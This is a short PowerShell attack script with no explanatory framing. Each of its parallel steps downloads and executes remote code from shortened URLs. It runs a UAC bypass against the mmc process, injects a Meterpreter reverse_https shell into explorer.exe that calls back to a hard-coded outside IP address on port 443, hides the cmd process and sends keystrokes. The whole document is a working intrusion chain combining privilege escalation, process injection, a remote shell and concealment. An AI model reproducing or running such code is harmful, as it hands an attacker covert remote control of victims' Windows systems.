#iwr https://goo.gl/x6ZcHM | iex;

workflow Test
{
    Parallel
    {
        iwr https://goo.gl/wxJHHq | iex; UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id;
        iwr https://goo.gl/4QsWoj | iex; Invoke-Shellcode -ProcessId $((ps -Name explorer).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443;
        sleep 1; $cmd="Invoke-Shellcode -ProcessId $((ps -Name explorer).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443;"
        iwr https://goo.gl/JwTLrZ | iex; hide-process cmd; sleep 0.7; send-keys -Name $cmd -Cmd $cmd
    }
}
